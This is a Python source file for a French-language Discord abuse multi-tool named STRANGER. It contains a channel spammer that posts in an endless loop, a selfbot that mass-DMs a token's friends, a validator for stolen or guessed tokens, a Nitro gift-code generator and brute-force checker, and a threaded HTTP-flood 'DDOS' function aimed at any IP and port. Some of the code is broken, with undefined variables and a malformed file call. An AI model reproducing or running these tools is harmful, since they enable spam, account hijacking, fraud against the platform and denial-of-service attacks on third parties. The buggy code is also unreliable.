from colorama import init, Fore
init()
import requests
import os
from os import system
import time
import socket
import random
import urllib.request , socket
import discord
import threading

def clear():
    system("cls")
    
system("mode 110, 34")

os.system("title STRANGER - DEV PAR AZULAX")
    

def TOKEN_CHECKER():
    clear()
    print(Fore.LIGHTBLACK_EX+"""
    ████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗  ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
    ╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║  ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
    ░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║  ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
    ░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║  ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
    ░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║  ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
    ░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝  ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
    """)
    print("oublie pas de mettre les tokens a verif dans le txt x))")
    time.sleep(3)
    with open("gen/token_gen.txt") as f:
        for line in f:
            token = line.strip("\n")
            headers = {'Content-Type': 'application/json', 'authorization': token}
            url = "https://discordapp.com/api/v6/users/@me/library"
            r = requests.get(url, headers=headers)
            if r.status_code == 200:
                print("{} | Token Valid".format(line.strip("\n")))
            else:
                print("Token Invalid | {}".format(line.strip("\n")))
        

def TOKEN_DM():

    clear()
    os.system("title STRANGER/TOKEN DM")
    print(Fore.GREEN +"""
                    ████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗  ██████╗░███╗░░░███╗
                    ╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║  ██╔══██╗████╗░████║
                    ░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║  ██║░░██║██╔████╔██║
                    ░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║  ██║░░██║██║╚██╔╝██║
                    ░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║  ██████╔╝██║░╚═╝░██║
                    ░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝  ╚═════╝░╚═╝░░░░░╚═╝
    """+ Fore.RESET)
    print("")

    token = input("[+]token :")
    clear()
    print(Fore.GREEN +"""
                    ████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗  ██████╗░███╗░░░███╗
                    ╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║  ██╔══██╗████╗░████║
                    ░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║  ██║░░██║██╔████╔██║
                    ░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║  ██║░░██║██║╚██╔╝██║
                    ░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║  ██████╔╝██║░╚═╝░██║
                    ░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝  ╚═════╝░╚═╝░░░░░╚═╝
    """+ Fore.RESET)
    id = input("[+]id :")
    clear()
    print(Fore.GREEN +"""
                    ████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗  ██████╗░███╗░░░███╗
                    ╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║  ██╔══██╗████╗░████║
                    ░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║  ██║░░██║██╔████╔██║
                    ░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║  ██║░░██║██║╚██╔╝██║
                    ░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║  ██████╔╝██║░╚═╝░██║
                    ░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝  ╚═════╝░╚═╝░░░░░╚═╝
    """+ Fore.RESET)
    

    message = input("[+]message :")
    clear()
    print(Fore.GREEN +"""
                    ████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗  ██████╗░███╗░░░███╗
                    ╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║  ██╔══██╗████╗░████║
                    ░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║  ██║░░██║██╔████╔██║
                    ░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║  ██║░░██║██║╚██╔╝██║
                    ░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║  ██████╔╝██║░╚═╝░██║
                    ░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝  ╚═════╝░╚═╝░░░░░╚═╝
    """+ Fore.RESET)

    def sendMessage(token, id, message):
        url = 'https://discordapp.com/api/v6/channels/{}/messages'.format(id)
        data = {"content": message}
        header = {"authorization": token}

        r = requests.post(url, data=data, headers=header)
        h = r.status_code
        if h == 200:
            print("[+] Message Send")
        elif h == 429:
            print("[/] chargement")
        else:
            print("[-] Faild !")

    while True:
        sendMessage(token, id, message)

def DM_ALL():
    clear()
    print(Fore.RED+"""
                                    ██████╗░███╗░░░███╗  ░█████╗░██╗░░░░░██╗░░░░░
                                    ██╔══██╗████╗░████║  ██╔══██╗██║░░░░░██║░░░░░
                                    ██║░░██║██╔████╔██║  ███████║██║░░░░░██║░░░░░
                                    ██║░░██║██║╚██╔╝██║  ██╔══██║██║░░░░░██║░░░░░
                                    ██████╔╝██║░╚═╝░██║  ██║░░██║███████╗███████╗
                                    ╚═════╝░╚═╝░░░░░╚═╝  ╚═╝░░╚═╝╚══════╝╚══════╝
"""+Fore.RESET)
    toto = input("[+] Token >>")
    missage = input("[+] Message >>")

    client = discord.Client()

    @client.event
    async def on_connect(message=missage):
        for user in client.user.friends:
            try:
                await user.send(message)
                print(f'envoyé a {user.name}')
            except:
                print(f'fail : {user.name}')
    client.run(toto, bot=False)




    


def TOKEN_TOOLS():
    clear()
    print(Fore.GREEN +"""
                ████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗  ████████╗░█████╗░░█████╗░██╗░░░░░░██████╗
                ╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝
                ░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░
                ░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║  ░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗
                ░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝
                ░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░
    """+Fore.RESET)
    print("")
    print(Fore.BLUE +"                                                    [1]SPAM CHANNELS"+Fore.RESET)
    print(Fore.BLUE+"                                                     [2]DMALL"+Fore.RESET)
    print("")
    print("                                                 L pour retourner en arrière")
    print("")
    token_choice = input(Fore.BLUE +"                                    [+] choix:"+ Fore.RESET)
    if token_choice == '1':
        TOKEN_DM()
    if token_choice == '2':
        DM_ALL()
    elif token_choice == 'l' or 'L':
        return

def DDOS():
    clear()
    print(Fore.LIGHTRED_EX+"""
                                    ██████╗░██████╗░░█████╗░░██████╗
                                    ██╔══██╗██╔══██╗██╔══██╗██╔════╝
                                    ██║░░██║██║░░██║██║░░██║╚█████╗░
                                    ██║░░██║██║░░██║██║░░██║░╚═══██╗
                                    ██████╔╝██████╔╝╚█████╔╝██████╔╝
                                    ╚═════╝░╚═════╝░░╚════╝░╚═════╝░
    """+Fore.RESET)
    with open("ddos/proxys.txt") as f:
        for line in f:
            proxys = line.strip("\n")
    target = input("[+] IP >")                                                                  
    port = int(input("[+] Port >"))
    threadee = input('[+] Thread >')        
    temps = int(input("[+] Temps >"))     
    timeout = time.time() + temps
    sent = 0

    while True:
        if time.time() > timeout:
            print('temps écouler x)')
            ime.sleep(2)
                
        else:
            pass
        def attack():
            while True:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.sendto(('GET /' + target + 'HTTP/1.1\r\n').encode('ascii'), (target, port))
                s.sendto(('Host: '+proxys+'\r\n\r\n').encode('ascii'), (target,port))
                s.close()
        
        for i in range(int(threadee)):
            thread = threading.Thread(target=attack)
            thread.start()
            

def NITRO_CHECKER():
    clear()
    print(Fore.MAGENTA+"""
        ███╗░░██╗██╗████████╗██████╗░░█████╗░  ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
        ████╗░██║██║╚══██╔══╝██╔══██╗██╔══██╗  ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
        ██╔██╗██║██║░░░██║░░░██████╔╝██║░░██║  ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
        ██║╚████║██║░░░██║░░░██╔══██╗██║░░██║  ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
        ██║░╚███║██║░░░██║░░░██║░░██║╚█████╔╝  ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
        ╚═╝░░╚══╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░  ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
    """+Fore.RESET)
    print("oublie pas de générer des nitros pour ensuite les vérif ;)")
    time.sleep(3)
   
    with open("gen/nitro_gen.txt") as f:
        number_line=0
        for line in f:
            nitro = line.strip("\n")
            number_line += 1
            os.system(f'title {number_line}')
 
            url = "https://discordapp.com/api/v6/entitlements/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"
 
            r = requests.get(url)
 
            if r.status_code == 200:
                print(Fore.GREEN+" Valid | {} ".format(line.strip("\n"))+Fore.RESET)
                with open('check/nitro_valide.txt' + 'w+') as f:
                    f.write(nitro)
                break
            else:
                pass
                
                print(Fore.RED+" Invalid | {} ".format(line.strip("\n"))+Fore.RED)
    print('tout à étais check ')
    time.sleep(2.8)
    
            



def NITRO_GENERATOR():
    clear()
    print("""
                        ███╗░░██╗██╗████████╗██████╗░░█████╗░  ░██████╗░███████╗███╗░░██╗
                        ████╗░██║██║╚══██╔══╝██╔══██╗██╔══██╗  ██╔════╝░██╔════╝████╗░██║
                        ██╔██╗██║██║░░░██║░░░██████╔╝██║░░██║  ██║░░██╗░█████╗░░██╔██╗██║
                        ██║╚████║██║░░░██║░░░██╔══██╗██║░░██║  ██║░░╚██╗██╔══╝░░██║╚████║
                        ██║░╚███║██║░░░██║░░░██║░░██║╚█████╔╝  ╚██████╔╝███████╗██║░╚███║
                        ╚═╝░░╚══╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░  ░╚═════╝░╚══════╝╚═╝░░╚══╝
    """)
    
    
    limite = 24
    lettres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    number = int(input("[+] Entre le nombre de nitro que tu veux générer >>"))
    o = open("gen/nitro_gen.txt", "w")
    for i in range(number):
        o.write('discord.gift/'+''.join(random.choice(lettres) for i in range(limite)) + '\n')
    o.close()
    print("vérifi ton dossier (les nitros ont étais générer la bas ;))")
    time.sleep(3.5)
    GENERATEUR_TOOLS()
    


def GENERATEUR_TOOLS():
    clear()
    print(Fore.CYAN+"""
           _____________   ____________  ___  ______________  ______     __________  ____  __   _____
          / ____/ ____/ | / / ____/ __ \/   |/_  __/ ____/ / / / __ \   /_  __/ __ \/ __ \/ /  / ___/
         / / __/ __/ /  |/ / __/ / /_/ / /| | / / / __/ / / / / /_/ /    / / / / / / / / / /   \__ \ 
        / /_/ / /___/ /|  / /___/ _, _/ ___ |/ / / /___/ /_/ / _, _/    / / / /_/ / /_/ / /______/ / 
        \____/_____/_/ |_/_____/_/ |_/_/  |_/_/ /_____/\____/_/ |_|    /_/  \____/\____/_____/____/  
                                                                                             
    """+Fore.RESET)
    print("")
    print(Fore.MAGENTA+"                                               [1]NITRO")
    print("                                               [2]TOKEN"+Fore.RESET)
    print("")
    print("                                            L pour retourner en arrière")
    print("")

    GENERATEUR_CHOICE = input(Fore.GREEN+"                            [+] Choice >>"+Fore.RESET)

    if GENERATEUR_CHOICE == '1':
        NITRO_GENERATOR()
    if GENERATEUR_CHOICE == '2':
        TOKEN_GEN()
    elif GENERATEUR_CHOICE == 'l' or 'L':
        return  

def GEOIP():
    clear()
    print("""
    
                    ░██████╗░███████╗░█████╗░██╗██████╗░
                    ██╔════╝░██╔════╝██╔══██╗██║██╔══██╗
                    ██║░░██╗░█████╗░░██║░░██║██║██████╔╝
                    ██║░░╚██╗██╔══╝░░██║░░██║██║██╔═══╝░
                    ╚██████╔╝███████╗╚█████╔╝██║██║░░░░░
                    ░╚═════╝░╚══════╝░╚════╝░╚═╝╚═╝░░░░░
    """)
    input('soon soon soon soon soon soon')


def PINGER():
    clear()
    print("""
                ██████╗░██╗███╗░░██╗░██████╗░███████╗██████╗░
                ██╔══██╗██║████╗░██║██╔════╝░██╔════╝██╔══██╗
                ██████╔╝██║██╔██╗██║██║░░██╗░█████╗░░██████╔╝
                ██╔═══╝░██║██║╚████║██║░░╚██╗██╔══╝░░██╔══██╗
                ██║░░░░░██║██║░╚███║╚██████╔╝███████╗██║░░██║
                ╚═╝░░░░░╚═╝╚═╝░░╚══╝░╚═════╝░╚══════╝╚═╝░░╚═╝
    """)
    print('soon soon soon soon soon soon soon soon soon soon soon soon soon soon soon soon')
    time.sleep(3)
  
def PROXY_CHECKER():
    print("""

    ██████╗░██████╗░░█████╗░██╗░░██╗██╗░░░██╗  ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
    ██╔══██╗██╔══██╗██╔══██╗╚██╗██╔╝╚██╗░██╔╝  ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
    ██████╔╝██████╔╝██║░░██║░╚███╔╝░░╚████╔╝░  ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
    ██╔═══╝░██╔══██╗██║░░██║░██╔██╗░░░╚██╔╝░░  ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
    ██║░░░░░██║░░██║╚█████╔╝██╔╝╚██╗░░░██║░░░  ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
    ╚═╝░░░░░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░  ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

    """)
    print("soon soon soon soon soon soon soon soon soon  soon soon soon soon soon soonsoon ")
    time.sleep(3)

def TOKEN_GEN():
    clear()
    print(Fore.MAGENTA+'''
            ████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗  ░██████╗░███████╗███╗░░██╗
            ╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║  ██╔════╝░██╔════╝████╗░██║
            ░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║  ██║░░██╗░█████╗░░██╔██╗██║
            ░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║  ██║░░╚██╗██╔══╝░░██║╚████║
            ░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║  ╚██████╔╝███████╗██║░╚███║
            ░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝  ░╚═════╝░╚══════╝╚═╝░░╚══╝
    '''+Fore.RESET)
    chars = ('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop')
    number = int(input('[+] Nombre de token >>'))
    for i in range(100):
        prems = ''.join((random.choice(chars) for i in range(24)))
        deux = ''.join((random.choice(chars) for i in range(6)))
        trois = ''.join((random.choice(chars) for i in range(27)))
    
        result = prems + '.'+ deux + '.' + trois
    
        l = open('gen/token_gen.txt', 'a')
        l.write(result + '\n')
        print("vérif ton fichier gen ;)")
        time.sleep(3)
    

def CHECKER():
    clear()
    print(Fore.BLUE+"""
    
    ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░  ████████╗░█████╗░░█████╗░██╗░░░░░░██████╗
    ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝
    ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝  ░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░
    ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗  ░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗
    ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝
    ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░
    """)
    print("")
    print("")
    print(Fore.MAGENTA+"                                            [1] Nitro")
    print(Fore.MAGENTA+"                                            [2] Token")
    print(Fore.MAGENTA+"                                            [3]proxy"+Fore.RESET)
    print("")
    CHECKER_choice = input("                                    [+] Choice >>")

    if CHECKER_choice == '1':
        NITRO_CHECKER()
    if CHECKER_choice == '2':
        TOKEN_CHECKER()
    if CHECKER_choice == '3':
        PROXY_CHECKER()
    elif CHECKER_choice == 'l' or 'L':
        return

def IP_TOOLS():
    clear()
    print(Fore.BLUE+"""
                                ██╗██████╗     ████████╗ ██████╗  ██████╗ ██╗     ███████╗
                                ██║██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
                                ██║██████╔╝       ██║   ██║   ██║██║   ██║██║     ███████╗
                                ██║██╔═══╝        ██║   ██║   ██║██║   ██║██║     ╚════██║
                                ██║██║            ██║   ╚██████╔╝╚██████╔╝███████╗███████║
                                ╚═╝╚═╝            ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
                                                                                      
    """+Fore.RESET)
    print("")
    print(Fore.MAGENTA+"                                         [1] = GEOIP")
    print(Fore.MAGENTA+"                                         [2] = PINGER")
    print(Fore.MAGENTA+"                                         [3] = DDOS"+Fore.RESET)
    print("")
    print(Fore.BLUE+"                                 L pour retourner en arrière"+Fore.RESET)
    print("")

    IP_choice = input(Fore.MAGENTA+"                         [>] Choix >>"+Fore.RESET)

    if IP_choice == '1':
        GEOIP()
    if IP_choice == '2':
        PINGER()
    if IP_choice == '3':
        DDOS()
    elif IP_choice == 'l' or 'L':
        return  

def main():
    clear()
    print(Fore.RED +"""                                         
  ██████ ▄▄▄█████▓ ██▀███   ▄▄▄       ███▄    █   ▄████ ▓█████  ██▀███   By Azulax
▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄     ██ ▀█   █  ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒ By Azulax
░ ▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄  ▓██  ▀█ ██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒ By Azulax
  ▒   ██▒░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄   By Azulax
▒██████▒▒  ▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒▒██░   ▓██░░▒▓███▀▒░▒████▒░██▓ ▒██▒ By Azulax
▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░ By Azulax 
░ ░▒  ░ ░    ░      ░▒ ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ▒░  ░   ░  ░ ░  ░  ░▒ ░ ▒░ By Azulax
░  ░  ░    ░        ░░   ░   ░   ▒      ░   ░ ░ ░ ░   ░    ░     ░░   ░  By Azulax
      ░              ░           ░  ░         ░       ░    ░  ░   ░      By Azulax            
    """+ Fore.RESET)
    print(Fore.MAGENTA+"""
        ╔════════════════════════════════════════════════╗
        ║[1]TOKEN_TOOLS             [2]GENERATEUR_TOOLS  ║
        ║[3]IP_TOOLS                [4]CHECKER_TOOLS     ║
        ╚════════════════════════════════════════════════╝
        """+Fore.MAGENTA)
    print("")

    choice = input(Fore.GREEN +"[+] Choix >>"+Fore.RESET)

    if choice == '1':
        TOKEN_TOOLS()
    if choice == '2':
        GENERATEUR_TOOLS()
    if choice == '3':
        IP_TOOLS()
    if choice == '4':
        CHECKER()

while True:
    clear()
    main()